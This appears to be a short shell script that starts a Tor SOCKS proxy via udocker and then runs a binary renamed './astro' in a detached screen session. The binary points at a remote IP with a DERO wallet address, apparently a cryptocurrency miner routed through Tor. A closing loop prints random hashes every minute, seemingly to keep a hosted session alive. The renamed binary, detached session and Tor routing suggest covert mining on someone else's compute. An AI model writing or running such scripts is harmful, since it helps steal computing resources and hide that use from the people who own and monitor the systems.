udocker run -p 127.0.0.1:9150:9150/tcp peterdavehello/tor-socks-proxy:latest &
sleep 2m
screen -dmS my ./astro -r 45.86.230.214:80 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj -p rpc -sock-address 127.0.0.1:9150
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
